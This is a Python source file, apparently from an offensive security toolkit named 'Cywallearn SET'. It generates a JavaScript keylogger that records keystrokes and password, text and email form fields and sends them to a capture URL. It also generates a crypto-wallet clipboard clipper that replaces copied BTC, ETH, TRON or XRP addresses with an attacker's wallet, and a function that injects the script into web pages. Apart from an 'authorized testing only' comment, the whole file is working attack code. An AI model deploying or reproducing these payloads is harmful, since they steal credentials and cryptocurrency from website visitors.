"""Cywallearn SET - Web Keylogger Injection"""

class WebKeylogger:
    """Generates JavaScript keylogger payload for injection"""
    
    def generate_payload(self, capture_url=""):
        """Generate JS keylogger code"""
        if not capture_url:
            capture_url = "http://localhost:5000/capture"
        
        return f"""
// Cywallearn Keylogger - FOR AUTHORIZED TESTING ONLY
(function() {{
    let keys = '';
    let lastSend = Date.now();
    const captureURL = '{capture_url}';
    
    document.addEventListener('keydown', function(e) {{
        const key = e.key;
        if (key.length === 1) {{
            keys += key;
        }} else if (key === ' ') {{
            keys += ' ';
        }} else if (key === 'Enter') {{
            keys += '[ENTER]';
        }} else if (key === 'Backspace') {{
            keys = keys.slice(0, -1);
        }} else if (key === 'Tab') {{
            keys += '[TAB]';
        }}
        
        // Send every 10 keystrokes or 5 seconds
        if (keys.length >= 10 || (Date.now() - lastSend) > 5000) {{
            if (keys.length > 0) {{
                sendKeys(keys);
                keys = '';
                lastSend = Date.now();
            }}
        }}
    }});
    
    // Also capture on form submit
    document.addEventListener('submit', function(e) {{
        const form = e.target;
        const inputs = form.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
        let formData = {{}};
        inputs.forEach(function(input) {{
            formData[input.name || input.type] = input.value;
        }});
        
        // Send captured form data
        fetch(captureURL + '/form', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(formData)
        }});
    }});
    
    function sendKeys(data) {{
        try {{
            navigator.sendBeacon(captureURL + '/keys', data);
        }} catch(e) {{
            // Fallback
            new Image().src = captureURL + '/keys?d=' + encodeURIComponent(data);
        }}
    }}
}})();
"""

    def generate_clipper_payload(self, wallet_addresses):
        """Generate crypto wallet clipper"""
        payload = f"""
// Cywallearn Crypto Clipper - FOR AUTHORIZED TESTING ONLY
(function() {{
    const wallets = {wallet_addresses};
    
    document.addEventListener('copy', function(e) {{
        setTimeout(function() {{
            const text = navigator.clipboard.readText();
            // Check if copied text looks like a wallet address
            const patterns = [
                /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{{25,39}}$/,  // BTC
                /^0x[a-fA-F0-9]{{40}}$/,  // ETH/ERC-20
                /^T[A-Za-z0-9]{{33}}$/,   // TRON
                /^r[0-9a-zA-Z]{{24,34}}$/  // XRP
            ];
            
            for (const pattern of patterns) {{
                if (pattern.test(text)) {{
                    // Replace with attacker's address
                    navigator.clipboard.writeText(wallets.ETH || wallets.BTC);
                    break;
                }}
            }}
        }}, 100);
    }});
}})();
"""
        return payload
    
    def inject_html(self, target_html, payload=""):
        """Inject keylogger into HTML page"""
        if not payload:
            payload = self.generate_payload()
        
        inject_script = f"<script>{payload}</script></body>"
        return target_html.replace('</body>', inject_script)